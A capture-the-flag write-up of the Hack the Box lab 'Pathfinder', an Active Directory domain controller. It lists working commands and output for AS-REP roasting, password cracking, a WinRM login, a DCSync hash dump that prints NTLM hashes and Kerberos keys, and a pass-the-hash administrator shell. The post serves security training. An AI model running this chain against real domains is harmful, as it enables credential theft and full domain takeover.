+++
title = "Hack the Box: Pathfinder"
date = 2023-01-22
description = "Hack the Box: Pathfinder"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Pathfinder

## Enumeration

`masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000`

Port 88 is typically associated with Kerberos and port 389 with LDAP, which indicates that this is a Domain Controller. We note that WinRM is enabled on port 5985.

Using the credentials we obtained in a previous machine; `sandra:Password1234!`

`bloodhound-python -d megacorp.local -u sandra -p "Password1234\!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`

`sudo NEO4J_HOME=/usr/share/java/neo4j neo4j start`

Connection with neo4j:neo4j then neo4j:bloodhound

## Foothold

```
/usr/bin/GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:6f4bdd147809926ee4f67179ae627cb6$7fe338746bc4b367f627c1588608c30ec756fc0a70e4a01e0f500198ec3b21f30cd54cc4d654af2e378bb8a633eea59d671af12e5d6cd7af29f4dfb1ca3c8003ee335be6292b88f9ed9cca5c8cf6113228194ee60d57d88468e5571205aac97837d2ca413cf1f3032fa2833962dfbb36db611a56f2c26d4d5e9c5203d5bcd6e9cc15476468e57de0f2baa8a89d97f5d9ba16a781624d45c4851940e315f798b4593a7df20bb660ef694c60ce9a818c2e7f585d7dd0388b8e6bed079eedd3398276a506f5bf1ec72148e8e2c0d73b440226dd7fc014d92ffe213810b9ef9d763c55be153c7cc3d2763c8c06fbc2baf3b7
```

```
john hash -wordlist=/usr/share/wordlists/rockyou.txt
```

It is now possible to access the server as svc_bes using WinRM:

```
/usr/bin/evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
```

```
*Evil-WinRM* PS C:\Users\svc_bes\Documents> cat ../Desktop/user.txt
b05fb166688a8603d970c6d033f637f1
```

## Privilege Escalation

```
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:88c7041ce91766c8753c54708ecd3632:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER$:aes256-cts-hmac-sha1-96:1628d4b5188101405a82cf1efc1e0b7d046a065673413b28741e59cea8968e04
PATHFINDER$:aes128-cts-hmac-sha1-96:4a7171e3d79a34e6693415742d20f008
PATHFINDER$:des-cbc-md5:e364941fc7ef5dd3
[*] Cleaning up... 
```

Now use psexec with the admin hashes:

```
psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
ee613b2d048303e5fd4ac6647d944645
```
